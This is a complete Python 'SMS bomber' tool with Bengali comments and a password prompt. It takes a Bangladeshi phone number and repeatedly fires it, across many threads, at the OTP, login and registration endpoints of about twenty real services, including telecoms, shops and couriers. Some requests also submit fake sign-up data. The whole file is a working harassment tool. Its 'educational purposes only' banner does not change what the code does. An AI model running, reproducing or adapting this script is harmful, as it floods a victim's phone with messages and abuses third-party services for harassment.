import os
import time
import threading
import requests
import json
import random

# --- কনফিগারেশন ---
PASSWORD = "shuvom"  # আপনার টুলটির পাসওয়ার্ড
TELEGRAM_CHANNEL = "https://t.me/minhaz_official24"
TOOL_VERSION = "v1.0 - Ultra Fast by shuvom"

# --- কাউন্টার এবং লক ---
counter = 0
lock = threading.Lock()

def update_counter():
    """সফলভাবে এসএমএস রিকোয়েস্ট পাঠানোর পর কাউন্টার আপডেট করে"""
    global counter
    with lock:
        counter += 1
        # গতি বেশি হলে সব আউটপুট দেখানো কঠিন, তাই প্রতি ১০টি রিকোয়েস্টে একবার প্রিন্ট করি
        if counter % 10 == 0 or counter == 1:
            print(f"\033[1;32m[+] Total SMS Requested: {counter}\033[0m")

def banner():
    """টুলের ব্যানার দেখায় এবং স্ক্রিন পরিষ্কার করে"""
    os.system("clear" if os.name == "posix" else "cls")
    print(r"""
 ██████╗  ██████╗ ██╗    ██╗███████╗██████╗ ███████╗██╗   ██╗██╗     
 ██╔══██╗██╔═══██╗██║    ██║██╔════╝██╔══██╗██╔════╝██║   ██║██║     
 ██████╔╝██║   ██║██║ █╗ ██║█████╗  ██████╔╝█████╗  ██║   ██║██║     
 ██╔═══╝ ██║   ██║██║███╗██║██╔══╝  ██╔══██╗██╔══╝  ██║   ██║██║     
 ██║     ╚██████╔╝╚███╔███╔╝███████╗██║  ██║██║     ╚██████╔╝███████╗
 ╚═╝      ╚═════╝  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚═╝      ╚═════╝ ╚══════╝

 ███████╗███╗   ███╗███████╗    ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
 ██╔════╝████╗ ████║██╔════╝    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
 ███████╗██╔████╔██║███████╗    ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
 ╚════██║██║╚██╔╝██║╚════██║    ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
 ███████║██║ ╚═╝ ██║███████║    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████║██║  ██║
 ╚══════╝╚═╝     ╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
""")
    print(f"  SHUVOM SMS BOMBER {TOOL_VERSION}")
    print(f"[+] Telegram Channel: {TELEGRAM_CHANNEL}")
    print(f"[+] Educational purposes only. Use at your own risk.")
    print("-" * 60)

def password_prompt():
    """টুল চালু করার আগে ব্যানার দেখিয়ে পাসওয়ার্ড চায়"""
    banner() # আপনার অনুরোধ অনুযায়ী ব্যানার দেখাচ্ছি
    print("\033[1;31m[!] This tool is password protected.\033[0m")
    pw = input("Enter password: ")
    if pw != PASSWORD:
        print("\033[1;31m[-] Incorrect Password. Exiting...\033[0m")
        exit()
    print("\033[1;32m[+] Access Granted!\033[0m")
    time.sleep(1)
    # অ্যাক্সেস পাওয়ার পর স্ক্রিন পরিষ্কার করে আবার ব্যানার দেখাই
    os.system("clear" if os.name == "posix" else "cls")
    banner()
    print("\033[1;36m[!] Join Telegram channel for updates.")
    print(f"[>] {TELEGRAM_CHANNEL}\033[0m")
    input("Press Enter to continue to the main menu...")

def get_target():
    """টার্গেট নম্বর ইনপুট নেয় এবং ফরম্যাট করে"""
    while True:
        number = input("Enter target number (01XXXXXXXXX): ")
        if number.startswith("01") and len(number) == 11 and number.isdigit():
            # নম্বর ফরম্যাট: ০১৬... (১১ ডিজিট)
            # ফুল নম্বর ফরম্যাট: ৮৮০১৬... (১৩ ডিজিট)
            return number, "880" + number[1:]
        else:
            print("\033[1;31m[-] Invalid number format. Please try again.\033[0m")

# --- API ফাংশন ---

# গতির জন্য টাইমআউট কমিয়ে ২ সেকেণ্ড করা হয়েছে
TIMEOUT_FAST = 2

# কিছু সাধারণ ইউজার এজেন্ট লিস্ট
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0'
]

def fast_apis(phone, full):
    """দ্রুত GET রিকোয়েস্ট API গুলো। গতির জন্য টাইমআউট কমানো হয়েছে।"""
    headers = {'User-Agent': random.choice(user_agents)}

    # ১. MyGP API
    try:
        requests.get(f"https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn={full}&lang=en&ng=0", headers=headers, timeout=TIMEOUT_FAST)
        update_counter()
    except: pass

    # ২. Fundesh API
    try:
        requests.get(f"https://fundesh.com.bd/api/auth/generateOTP?service_key=&phone={phone}", headers=headers, timeout=TIMEOUT_FAST)
        update_counter()
    except: pass

    # ৩. Rokomari API
    try:
        requests.get(f"https://www.rokomari.com/otp/send?emailOrPhone=88{phone}&countryCode=BD", headers=headers, timeout=TIMEOUT_FAST)
        update_counter()
    except: pass

    # ৪. Ultranetrn API
    try:
        requests.get(f"https://ultranetrn.com.br/fonts/api.php?number={phone}", headers=headers, timeout=TIMEOUT_FAST)
        update_counter()
    except: pass

    # ৫. Bikroy API
    try:
        requests.get(f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}", headers=headers, timeout=TIMEOUT_FAST)
        update_counter()
    except: pass
    
    try:
        requests.get(f"https://bd-bomber.onrender.com/orko?msisdn=", headers=headers, timeout=TIMEOUT_FAST)
        update_counter()
    except: pass


def normal_apis(phone, full):
    """POST রিকোয়েস্ট বা ডেটা পাঠানো API গুলো। গতির জন্য টাইমআউট কমানো হয়েছে।"""
    
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': random.choice(user_agents)
    }

    # ডামি ডেটা যা অনেক API তে কাজ করে
    dummy_name = "User Test"
    dummy_email = "test.user@gmail.com"

    # API লিস্ট (URL, Data, Method)
    apis = [
        # --- আগের API গুলো ---
        ("https://webloginda.grameenphone.com/backend/api/v1/otp", {"msisdn": full}, "POST"),
        ("https://api.osudpotro.com/api/v1/users/send_otp", {"phone": phone}, "POST"),
        ("https://da-api.robi.com.bd/da-nll/otp/send", {"msisdn": full}, "POST"),
        
        # --- নতুন API গুলো ---
        
        # ১. Coke Studio (store-and-send-otp)
        ("https://cokestudio23.sslwireless.com/api/store-and-send-otp", 
         {"msisdn": full, "name": dummy_name, "email": dummy_email, "dob": "2000-01-01", "occupation": "N/A", "gender": "male"}, 
         "POST"),
        
        # ২. Coke Studio (check-gp-number)
        ("https://cokestudio23.sslwireless.com/api/check-gp-number", {"msisdn": phone}, "POST"),
        
        # ৩. RabbitholeBD
        ("https://apix.rabbitholebd.com/appv2/login/requestOTP", {"mobile": f"+{full}"}, "POST"),
        
        # ৪. Swap
        ("https://api.swap.com.bd/api/v1/send-otp", {"phone": phone}, "POST"),
        
        # ৫. Airtel (login/register) - একটিতে ট্রাই করলেই ওটিপি যায়
        ("https://api.bd.airtel.com/v1/account/login/otp", {"phone_number": phone}, "POST"),
        
        # ৬. Prothom Alo / Hoichoi - একই ভিউলিফ্ট API ব্যবহার করে
        ("https://prod-api.viewlift.com/identity/signup?site=prothomalo", 
         {"requestType": "send", "phoneNumber": f"+{full}", "emailConsent": True, "whatsappConsent": False}, 
         "POST"),
        
        # ৭. Paperfly
        ("https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", 
         {"full_name": dummy_name, "company_name": "TestCo", "email_address": dummy_email, "phone_number": phone}, 
         "POST"),
        
        # ৮. Eonbazar
        ("https://app.eonbazar.com/api/auth/register", 
         {"mobile": phone, "name": dummy_name, "password": "password123", "email": dummy_email}, 
         "POST"),
        
        # ৯. eCourier (GET)
        (f"https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={phone}", {}, "GET")
    ]

    # ডুপ্লিকেট API বাদ দেওয়া হয়েছে এবং কিছু API ডেটা ডামি করা হয়েছে গতির জন্য।
    # Apex, Bohubrihi, RedX এবং Sundarban Courier কিছু ক্ষেত্রে ধীরে কাজ করে তাই Ultrafast এডিশনে বাদ দেওয়া হলো।

    for url, data, method in apis:
        try:
            if method == "POST":
                # দ্রুত রেসপন্সের জন্য timeout ২ সেকেণ্ড করা হয়েছে
                requests.post(url, data=json.dumps(data), headers=headers, timeout=TIMEOUT_FAST)
            elif method == "GET":
                requests.get(url, headers=headers, timeout=TIMEOUT_FAST)
            update_counter()
        except:
            pass

def start_bombing():
    """বম্বিং প্রক্রিয়া শুরু করে"""
    global counter
    
    phone, full = get_target()
    
    # বম্বিং শুরু করার আগে ব্যানার দেখাই
    os.system("clear" if os.name == "posix" else "cls")
    banner() 
    
    print(f"\033[1;33m[!] Starting ULTRA FAST bombing on {phone}... Press Ctrl+C to stop.\033[0m")
    time.sleep(2)
    counter = 0  # বম্বিং শুরু করার সময় কাউন্টার রিসেট করি

    while True:
        try:
            threads = []

            # দ্রুত API গুলোর জন্য অনেক বেশি থ্রেড (২০টি)
            for _ in range(20): 
                t = threading.Thread(target=fast_apis, args=(phone, full))
                t.daemon = True # যাতে টুল বন্ধ করলে থ্রেডগুলোও বন্ধ হয়
                t.start()
                threads.append(t)

            # সাধারণ API গুলোর জন্যও একাধিক থ্রেড (৫টি)
            for _ in range(5):
                t_normal = threading.Thread(target=normal_apis, args=(phone, full))
                t_normal.daemon = True
                t_normal.start()
                threads.append(t_normal)

            # সব থ্রেড শেষ হওয়ার জন্য অপেক্ষা করি
            for t in threads:
                t.join()
            
            # প্রতি সাইকেলের মাঝে বিরতি প্রায় শূন্য (০.১ সেকেণ্ড) করে প্রচুর ফাস্ট করা হয়েছে
            time.sleep(0.1)

        except KeyboardInterrupt:
            print("\n\033[1;31m[-] Bombing stopped by user.\033[0m")
            input("Press Enter to return to menu...")
            return

def menu():
    """মূল মেনু"""
    while True:
        banner()
        print("\n\033[1;36m[1] Start SMS Bombing\n[2] Join Telegram Channel\n[3] Exit\033[0m")
        choice = input("Select an option: ")
        if choice == "1":
            start_bombing()
        elif choice == "2":
            # টেলিগ্রাম চ্যানেল খোলার চেষ্টা করি
            try:
                os.system(f"termux-open {TELEGRAM_CHANNEL}" if os.name == "posix" else f"start {TELEGRAM_CHANNEL}")
            except:
                print(f"[!] Please join manually: {TELEGRAM_CHANNEL}")
                time.sleep(2)
        elif choice == "3":
            print("\033[1;31m[-] Exiting... Goodbye!\033[0m")
            exit()
        else:
            print("\033[1;31m[-] Invalid choice. Please try again.\033[0m")
            time.sleep(1)

if __name__ == "__main__":
    # কোড চালু হলে প্রথমে পাসওয়ার্ড চাইবে (ব্যানার সহ)
    password_prompt()
    # তারপর মেনু দেখাবে
    menu()
